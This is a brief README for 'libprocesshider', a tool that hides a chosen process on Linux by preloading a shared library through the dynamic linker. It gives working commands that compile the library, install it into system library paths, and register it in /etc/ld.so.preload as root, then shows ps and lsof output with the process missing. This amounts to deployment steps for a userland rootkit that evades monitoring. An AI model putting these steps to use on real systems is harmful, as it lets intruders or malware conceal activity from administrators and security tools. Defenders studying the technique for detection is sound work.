libprocesshider
===============

Hide a process under Linux using the ld preloader.

Full tutorial available at https://sysdigcloud.com/hiding-linux-processes-for-fun-and-profit/

In short, compile the library:

```
gianluca@sid:~/libprocesshider$ make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
gianluca@sid:~/libprocesshider$ mkdir {32,64}
gianluca@sid:~/libprocesshider$ gcc -Wall -m32 -fPIC -shared -o 32/libprocesshider.so processhider.c -ldl
gianluca@sid:~/libprocesshider$ gcc -Wall -fPIC -shared -o 64/libprocesshider.so processhider.c -ldl
gianluca@sid:~/libprocesshider$ sudo mv 32/libprocesshider.so /usr/lib32/libprocesshider.so
gianluca@sid:~/libprocesshider$ sudo mv 64/libprocesshider.so /usr/lib/x86_64-linux-gnu/libprocesshider.so
```

Load it with the global dynamic linker

```
root@sid:~# echo '/usr/$LIB/libprocesshider.so' > /etc/ld.so.preload
```

And your process will be off the radar 

```
gianluca@sid:~$ sudo ps aux
USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND
...

gianluca@sid:~$ sudo lsof -ni
COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAME
...
```
